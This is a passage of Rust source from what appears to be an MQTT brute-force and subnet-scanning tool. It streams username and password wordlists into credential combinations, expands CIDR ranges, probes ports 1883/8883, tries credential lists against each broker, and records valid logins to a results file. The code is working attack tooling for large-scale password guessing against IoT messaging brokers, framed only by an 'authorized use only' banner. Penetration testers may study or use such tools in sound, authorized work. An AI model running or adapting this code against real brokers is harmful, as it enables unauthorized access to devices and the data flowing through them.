async fn enqueue_wordlist_combos_streaming(
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
    username_path: &str,
    password_path: &str,
    full_combo: bool,
    stop_flag: Arc<AtomicBool>,
    username_count: usize,
    _password_count: usize,
) -> Result<()> {
    if full_combo {
        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();

        while let Some(user_line) = user_lines.next_line().await? {
            let user = user_line.trim();
            if user.is_empty() || stop_flag.load(Ordering::Relaxed) {
                continue;
            }
            let user_arc: Arc<str> = Arc::from(user);

            let pass_file = File::open(password_path).await?;
            let pass_reader = BufReader::new(pass_file);
            let mut pass_lines = pass_reader.lines();

            while let Some(pass_line) = pass_lines.next_line().await? {
                let pass = pass_line.trim();
                if pass.is_empty() || stop_flag.load(Ordering::Relaxed) {
                    continue;
                }
                let pass_arc: Arc<str> = Arc::from(pass);
                tx.send((user_arc.clone(), pass_arc)).await.ok();
            }
        }
    } else if username_count == 1 {
        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();
        let user_line = user_lines.next_line().await?.ok_or_else(|| anyhow!("Empty file"))?;
        let user_arc: Arc<str> = Arc::from(user_line.trim());

        let pass_file = File::open(password_path).await?;
        let pass_reader = BufReader::new(pass_file);
        let mut pass_lines = pass_reader.lines();

        while let Some(pass_line) = pass_lines.next_line().await? {
            let pass = pass_line.trim();
            if pass.is_empty() || stop_flag.load(Ordering::Relaxed) {
                continue;
            }
            let pass_arc: Arc<str> = Arc::from(pass);
            tx.send((user_arc.clone(), pass_arc)).await.ok();
        }
    } else {
        let pass_file = File::open(password_path).await?;
        let pass_reader = BufReader::new(pass_file);
        let mut pass_lines = pass_reader.lines();
        let pass_line = pass_lines.next_line().await?.ok_or_else(|| anyhow!("Empty file"))?;
        let pass_arc: Arc<str> = Arc::from(pass_line.trim());

        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();

        while let Some(user_line) = user_lines.next_line().await? {
            let user = user_line.trim();
            if user.is_empty() || stop_flag.load(Ordering::Relaxed) {
                continue;
            }
            let user_arc: Arc<str> = Arc::from(user);
            tx.send((user_arc, pass_arc.clone())).await.ok();
        }
    }

    Ok(())
}

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

async fn load_wordlist(path: &str) -> Result<Vec<String>> {
    let content = tokio::fs::read_to_string(path).await?;
    Ok(content
        .lines()
        .filter_map(|s| {
            let trimmed = s.trim();
            (!trimmed.is_empty()).then(|| trimmed.to_string())
        })
        .collect())
}

async fn count_nonempty_lines(path: &str) -> Result<usize> {
    let content = tokio::fs::read_to_string(path).await?;
    Ok(content.lines().filter(|line| !line.trim().is_empty()).count())
}

fn should_use_streaming(total_size: u64) -> bool {
    if total_size > MAX_MEMORY_SIZE {
        let size_mb = total_size as f64 / (1024.0 * 1024.0);
        println!("\n{}", format!("[!] Large wordlists: {:.1} MB", size_mb).yellow());
        println!("Options:");
        println!("  1. Load into memory (faster, ~{:.0} MB RAM)", size_mb);
        println!("  2. Streaming mode (slower, minimal memory)");
        println!();
        !prompt_yes_no("Load into memory? (y/n): ", true)
    } else {
        false
    }
}

async fn load_wordlists_streaming(
    config: &MqttBruteforceConfig,
) -> Result<(Vec<String>, Vec<String>, usize, usize)> {
    println!("[*] Using streaming mode...");
    let user_count = count_nonempty_lines(&config.username_wordlist).await?;
    let pass_count = if let Some(ref path) = config.password_wordlist {
        count_nonempty_lines(path).await?
    } else {
        0
    };
    Ok((Vec::new(), Vec::new(), user_count, pass_count))
}

async fn load_wordlists_memory(
    config: &MqttBruteforceConfig,
) -> Result<(Vec<String>, Vec<String>, usize, usize)> {
    println!("[*] Loading wordlists into memory...");
    let (usernames, passwords) = tokio::join!(
        load_wordlist(&config.username_wordlist),
        async {
            if let Some(ref path) = config.password_wordlist {
                load_wordlist(path).await
            } else {
                Ok(Vec::new())
            }
        }
    );

    let usernames = usernames?;
    let passwords = passwords?;
    Ok((usernames.clone(), passwords.clone(), usernames.len(), passwords.len()))
}

fn calculate_estimated_attempts(
    config: &MqttBruteforceConfig,
    username_count: usize,
    password_count: usize,
) -> usize {
    if config.full_combo {
        username_count * password_count
    } else if username_count == 1 {
        password_count
    } else if password_count == 1 {
        username_count
    } else {
        password_count
    }
}

async fn initialize_output_file(output_file: &str, config: &MqttBruteforceConfig) -> Result<()> {
    if !config.append_mode {
        let mut f = File::create(output_file).await?;
        f.write_all(format!("# MQTT Results - {}\n", chrono::Local::now()).as_bytes()).await?;
        f.write_all(format!("# Target: {}:{}\n", config.target, config.port).as_bytes()).await?;
        f.write_all(b"# Format: username:password\n\n").await?;
    }
    Ok(())
}

async fn validate_mqtt_target(host: &str, config: &MqttBruteforceConfig) -> Result<()> {
    // Try to connect and send a CONNECT packet without credentials
    let addr = format!("{}:{}", host, config.port);
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;

    let stream = match timeout(
        Duration::from_secs(config.connection_timeout),
        TcpStream::connect(socket)
    ).await {
        Ok(Ok(s)) => s,
        _ => return Err(anyhow!("Cannot connect to MQTT broker")),
    };

    // Build a simple CONNECT packet (no auth)
    let connect_packet = build_mqtt_connect_packet(&config.client_id, None, None, config.keep_alive);

    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut stream = stream;
    stream.write_all(&connect_packet).await?;
    stream.flush().await?;

    // Read CONNACK
    let mut buffer = vec![0u8; 4];
    match timeout(Duration::from_secs(config.read_timeout), stream.read(&mut buffer)).await {
        Ok(Ok(n)) if n >= 4 => {
            if let Some(_return_code) = parse_connack(&buffer[..n]) {
                // Any return code means it's an MQTT broker (even if auth failed)
                Ok(())
            } else {
                Err(anyhow!("Invalid MQTT response"))
            }
        }
        _ => Err(anyhow!("No response from MQTT broker")),
    }
}

async fn append_result(output_file: &str, username: &str, password: &str) -> Result<()> {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(output_file)
        .await?;

    file.write_all(format!("{}:{}\n", username, password).as_bytes()).await?;
    file.flush().await?;
    Ok(())
}

async fn print_final_report(
    found_creds: &Arc<Mutex<HashSet<(String, String)>>>,
    output_file: &str,
) {
    let found = found_creds.lock().await;
    println!();
    if found.is_empty() {
        println!("{}", "[-] No valid credentials found".yellow());
    } else {
        println!("{}", format!("[+] Found {} credential(s):", found.len()).green().bold());
        let mut sorted: Vec<_> = found.iter().collect();
        sorted.sort();
        for (u, p) in sorted.iter() {
            println!("  {}  {}:{}", "✓".green(), u, p);
        }
        println!("\n[*] Results saved to: {}", output_file);
    }
}

async fn execute_batch_scan(config: BatchScanConfig) -> Result<()> {
    let semaphore = Arc::new(tokio::sync::Semaphore::new(config.max_concurrent));
    let mut tasks = Vec::new();

    println!("Starting scan with {} concurrent tasks...", config.max_concurrent);
    println!();

    for target in config.targets.clone() {
        let sem = semaphore.clone();
        let cfg = config.clone();

        let task = tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            scan_target(target, &cfg).await
        });

        tasks.push(task);
    }

    let mut all_results = Vec::new();
    let mut open_ports = 0;
    let mut valid_creds = 0;

    for task in tasks {
        match task.await {
            Ok(results) => {
                open_ports += results.len();
                valid_creds += results.iter().filter(|r| r.credentials.is_some()).count();
                all_results.extend(results);
            }
            Err(e) => {
                println!("{} Task error: {}", "[!]".red(), e);
            }
        }
    }

    println!();
    save_batch_results(&all_results, &config.output_file)?;

    println!();
    println!("{}", "=== Scan Summary ===".bright_blue().bold());
    println!("Targets scanned:       {}", config.targets.len());
    println!("Open MQTT ports:      {}", open_ports);
    println!("Valid credentials:     {} {}", valid_creds,
             if valid_creds > 0 { "✓".green() } else { "✗".red() });
    println!("Results saved to:      {}", config.output_file);

    if valid_creds > 0 {
        println!();
        println!("{}", "Valid credentials found:".bright_green().bold());
        for result in &all_results {
            if let Some((u, p)) = &result.credentials {
                println!("  • {}:{} - {}/{}", result.ip, result.port, u,
                         if p.is_empty() { "(blank)" } else { p });
            }
        }
    }

    Ok(())
}

async fn scan_target(ip: String, config: &BatchScanConfig) -> Vec<ScanResult> {
    let mut results = Vec::new();

    for &port in &config.ports {
        if config.verbose {
            println!("{} Scanning {}:{}...", "[*]".cyan(), ip, port);
        }

        let banner = match check_port(&ip, port, config.timeout).await {
            Ok(Some(b)) => b,
            _ => {
                if config.verbose {
                    println!("  {} Port closed", "[✗]".red());
                }
                continue;
            }
        };

        println!("{} {}:{} - Port open", "[+]".green(), ip, port);

        if config.verbose && !banner.is_empty() {
            println!("  [*] Banner: {}", banner.trim());
        }

        let mut found_creds = None;

        for (username, password) in &config.credentials {
            if config.verbose {
                println!("  [*] Trying {}/{}", username,
                         if password.is_empty() { "(blank)" } else { password });
            }

            let use_tls = port == 8883 || config.use_tls;
            match try_mqtt_login_simple(&ip, port, username, password, use_tls,
                                      config.timeout.as_secs()).await {
                Ok(true) => {
                    println!(
                        "{} {}:{} - Valid: {}/{}",
                        "[✓]".bright_green().bold(),
                             ip, port, username,
                             if password.is_empty() { "(blank)" } else { password }
                    );
                    found_creds = Some((username.clone(), password.clone()));
                    break;
                }
                Ok(false) => {
                    if config.verbose {
                        println!("  {} Invalid", "[✗]".red());
                    }
                }
                Err(e) => {
                    if config.verbose {
                        println!("  {} Error: {}", "[!]".yellow(), e);
                    }
                }
            }

            sleep(Duration::from_millis(100)).await;
        }

        results.push(ScanResult {
            ip: ip.clone(),
            port,
            banner: banner.trim().to_string(),
            credentials: found_creds,
            timestamp: chrono::Utc::now().to_rfc3339(),
        });
    }

    results
}

async fn check_port(ip: &str, port: u16, timeout_duration: Duration) -> Result<Option<String>> {
    use tokio::net::TcpStream;
    use std::net::SocketAddr;
    
    let addr = format!("{}:{}", ip, port);
    let socket: SocketAddr = addr.parse()?;

    let stream = match timeout(timeout_duration, TcpStream::connect(&socket)).await {
        Ok(Ok(s)) => s,
        _ => return Ok(None),
    };

    let mut stream = stream;
    let mut buffer = vec![0u8; 512];

    let banner = match timeout(Duration::from_secs(2), tokio::io::AsyncReadExt::read(&mut stream, &mut buffer)).await {
        Ok(Ok(n)) if n > 0 => String::from_utf8_lossy(&buffer[..n]).to_string(),
        _ => String::new(),
    };

    Ok(Some(banner))
}

fn save_batch_results(results: &[ScanResult], filename: &str) -> Result<()> {
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(filename)?;

    use std::io::Write;
    for result in results {
        let creds_str = match &result.credentials {
            Some((u, p)) => format!("{}/{}", u, if p.is_empty() { "(blank)" } else { p }),
            None => "none".to_string(),
        };

        writeln!(
            file,
            "[{}] {}:{} - {} - banner: {}",
            result.timestamp,
            result.ip,
            result.port,
            creds_str,
            result.banner.replace('\n', " ").replace('\r', "")
        )?;
    }

    Ok(())
}

// ============================================================
// CONFIGURATION FUNCTIONS
// ============================================================

async fn build_interactive_config(target: &str) -> Result<MqttBruteforceConfig> {
    println!();
    println!("{}", "[Interactive Configuration]".bold().green());
    println!();

    let port = prompt_port(1883);
    let threads = prompt_threads(8);
    let delay_ms = prompt_delay(100);
    let connection_timeout = prompt_timeout("Connection timeout (seconds, default 3): ", 3);
    let read_timeout = prompt_timeout("Read timeout (seconds, default 1): ", 1);

    let username_wordlist = prompt_wordlist("Username wordlist file: ")?;
    let password_wordlist = prompt_optional_wordlist("Password wordlist (leave blank to skip): ")?;

    let full_combo = prompt_yes_no("Try every username with every password? (y/n): ", false);
    let stop_on_success = prompt_yes_no("Stop on first valid login? (y/n): ", false);

    let output_file = prompt_required("Output file: ");
    let append_mode = if tokio::fs::metadata(&output_file).await.is_ok() {
        prompt_yes_no(&format!("File exists. Append? (y/n): "), true)
    } else {
        false
    };

    let verbose = prompt_yes_no("Verbose mode? (y/n): ", false);
    let pre_validate = prompt_yes_no("Pre-validate target? (y/n): ", true);
    let retry_on_error = prompt_yes_no("Retry failed connections? (y/n): ", true);
    let max_retries = if retry_on_error { prompt_retries(2) } else { 0 };

    let use_tls = port == 8883 || prompt_yes_no("Use TLS? (y/n): ", false);
    let client_id = prompt_required("Client ID (default mqtt_scanner): ");
    let client_id = if client_id.is_empty() {
        "mqtt_scanner".to_string()
    } else {
        client_id
    };
    let keep_alive: u16 = prompt_required("Keep alive (seconds, default 60): ")
        .parse()
        .unwrap_or(60);

    Ok(MqttBruteforceConfig {
        target: target.to_string(),
        port,
        username_wordlist,
        password_wordlist,
        threads,
        delay_ms,
        connection_timeout,
        read_timeout,
        stop_on_success,
        verbose,
        full_combo,
        output_file,
        append_mode,
        pre_validate,
        retry_on_error,
        max_retries,
        use_tls,
        client_id,
        keep_alive,
    })
}

async fn load_and_validate_config(path: &str, target: &str) -> Result<MqttBruteforceConfig> {
    let content = tokio::fs::read_to_string(path).await?;
    let mut config: MqttBruteforceConfig = serde_json::from_str(&content)?;
    config.target = target.to_string();

    let mut errors = Vec::new();

    if config.port == 0 { errors.push("Port must be > 0".to_string()); }
    if config.threads == 0 || config.threads > 256 {
        errors.push("Threads must be 1-256".to_string());
    }
    if !(1..=60).contains(&config.connection_timeout) {
        errors.push("Connection timeout: 1-60s".to_string());
    }

    if !errors.is_empty() {
        return Err(anyhow!("Validation errors:\n  - {}", errors.join("\n  - ")));
    }

    Ok(config)
}

async fn save_config(config: &MqttBruteforceConfig, path: &str) -> Result<()> {
    let json = serde_json::to_string_pretty(config)?;
    tokio::fs::write(path, json).await?;
    Ok(())
}

fn print_config_summary(config: &MqttBruteforceConfig) {
    println!("\n{}", "=== Configuration ===".bold().cyan());
    println!("  Target:     {}:{}", config.target, config.port);
    println!("  Threads:    {}", config.threads);
    println!("  Delay:      {}ms", config.delay_ms);
    println!("  Output:     {}", config.output_file);
    println!("  Use TLS:    {}", config.use_tls);
    println!("  Client ID:  {}", config.client_id);
    println!("  Keep alive: {}s", config.keep_alive);
    println!("{}", "====================".cyan());
}

fn print_config_format() {
    println!("{}", "=== JSON Configuration Format ===".bold().cyan());
    println!("{}", r##"{
    "port": 1883,
    "username_wordlist": "users.txt",
    "password_wordlist": "passwords.txt",
    "threads": 8,
    "delay_ms": 100,
    "connection_timeout": 3,
    "read_timeout": 1,
    "stop_on_success": false,
    "verbose": false,
    "full_combo": false,
    "output_file": "results.txt",
    "append_mode": false,
    "pre_validate": true,
    "retry_on_error": true,
    "max_retries": 2,
    "use_tls": false,
    "client_id": "mqtt_scanner",
    "keep_alive": 60
}
"##);
    println!("{}", "================================".cyan());
}

fn parse_single_target(input: &str) -> Result<Vec<String>> {
    let input = input.trim();

    if input.contains('/') {
        match input.parse::<ipnetwork::IpNetwork>() {
            Ok(network) => {
                let mut ips = Vec::new();
                for ip in network.iter() {
                    ips.push(ip.to_string());
                }
                println!("[*] Expanded {} to {} hosts", input, ips.len());
                Ok(ips)
            }
            Err(_) => Err(anyhow!("Invalid CIDR: {}", input)),
        }
    } else {
        Ok(vec![input.to_string()])
    }
}

fn parse_targets(input: &str) -> Result<Vec<String>> {
    let mut targets = Vec::new();

    for line in input.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        if line.contains('/') {
            match line.parse::<ipnetwork::IpNetwork>() {
                Ok(network) => {
                    for ip in network.iter() {
                        targets.push(ip.to_string());
                    }
                }
                Err(_) => println!("{} Invalid CIDR: {}", "[!]".yellow(), line),
            }
        } else {
            targets.push(line.to_string());
        }
    }

    Ok(targets)
}

async fn load_credentials_file(path: &str) -> Result<Vec<(String, String)>> {
    let content = tokio::fs::read_to_string(path).await?;
    let mut creds = Vec::new();

    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        if let Some((user, pass)) = line.split_once(':') {
            creds.push((user.trim().to_string(), pass.trim().to_string()));
        }
    }

    Ok(creds)
}

fn normalize_target(host: &str, default_port: u16) -> Result<String> {
    static TARGET_REGEX: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$")
            .expect("Invalid regex")
    });

    let caps = TARGET_REGEX
        .captures(host.trim())
        .ok_or_else(|| anyhow!("Invalid target format"))?;

    let addr = caps.name("addr").unwrap().as_str();
    let port = if let Some(m) = caps.name("port") {
        m.as_str().parse::<u16>()?
    } else {
        default_port
    };

    let formatted = if addr.contains(':') && !addr.contains('.') {
        format!("[{}]:{}", addr, port)
    } else {
        format!("{}:{}", addr, port)
    };

    formatted.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;

    Ok(formatted)
}


// ============================================================
// PROMPT/INPUT FUNCTIONS
// ============================================================
// PROMPT/INPUT FUNCTIONS
// ============================================================

fn display_banner() {
    println!();
    println!("{}", "╔══════════════════════════════════════════════╗".bright_cyan());
    println!("{}", "║   MQTT SECURITY TESTING MODULE             ║".bright_cyan());
    println!("{}", "║   Advanced Bruteforce & Subnet Scanner     ║".bright_cyan());
    println!("{}", "╚══════════════════════════════════════════════╝".bright_cyan());
    println!();
    println!("{}", "⚠️  AUTHORIZED USE ONLY".yellow().bold());
    println!("{}", "    Unauthorized access is ILLEGAL".yellow());
    println!();
}

fn prompt(msg: &str) -> String {
    use std::io::Write;
    print!("{}", msg);
    let _ = std::io::stdout().flush();
    let mut buf = String::new();
    match std::io::stdin().read_line(&mut buf) {
        Ok(_) => buf.trim().to_string(),
        Err(_) => String::new(),
    }
}

fn prompt_required(msg: &str) -> String {
    loop {
        let input = prompt(msg);
        if !input.trim().is_empty() {
            return input.trim().to_string();
        }
        println!("[!] This field is required.");
    }
}

fn prompt_port(default: u16) -> u16 {
    loop {
        let input = prompt(&format!("Port (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<u16>() {
            Ok(port) if port > 0 => return port,
            _ => println!("[!] Invalid port."),
        }
    }
}

fn prompt_delay(default: u64) -> u64 {
    loop {
        let input = prompt(&format!("Delay in ms (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<u64>() {
            Ok(val) if val <= 10000 => return val,
            _ => println!("[!] Invalid delay (max 10000ms)."),
        }
    }
}

fn prompt_timeout(msg: &str, default: u64) -> u64 {
    loop {
        let input = prompt(msg);
        if input.is_empty() {
            return default;
        }
        match input.parse::<u64>() {
            Ok(val) if val > 0 && val <= 60 => return val,
            _ => println!("[!] Invalid timeout (1-60s)."),
        }
    }
}
fn prompt_threads(default: usize) -> usize {
    loop {
        let input = prompt(&format!("Threads (default {}): ", default));
        if input.is_empty() {
            return default.max(1);
        }
        match input.parse::<usize>() {
            Ok(val) if val >= 1 && val <= 256 => return val,
            _ => println!("[!] Invalid (1-256)."),
        }
    }
}

fn prompt_retries(default: usize) -> usize {
    loop {
        let input = prompt(&format!("Max retries (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<usize>() {
            Ok(val) if val <= 10 => return val,
            _ => println!("[!] Invalid (max 10)."),
        }
    }
}

fn prompt_yes_no(message: &str, default: bool) -> bool {
    loop {
        let input = prompt(message);
        if input.is_empty() {
            return default;
        }
        match input.to_lowercase().as_str() {
            "y" | "yes" => return true,
            "n" | "no" => return false,
            _ => println!("[!] Please respond with y or n."),
        }
    }
}

fn prompt_wordlist(prompt_text: &str) -> Result<String> {
    loop {
        let path = prompt(prompt_text);
        if path.is_empty() {
            println!("[!] Path cannot be empty.");
            continue;
        }
        let trimmed = path.trim();
        if Path::new(trimmed).is_file() {
            return Ok(trimmed.to_string());
        } else {
            println!("[!] File '{}' not found.", trimmed);
        }
    }
}

fn prompt_optional_wordlist(prompt_text: &str) -> Result<Option<String>> {
    loop {
        let path = prompt(prompt_text);
        if path.is_empty() {
            return Ok(None);
        }
        let trimmed = path.trim();
        if Path::new(trimmed).is_file() {
            return Ok(Some(trimmed.to_string()));
        } else {
            println!("[!] File '{}' not found.", trimmed);
        }
    }
}
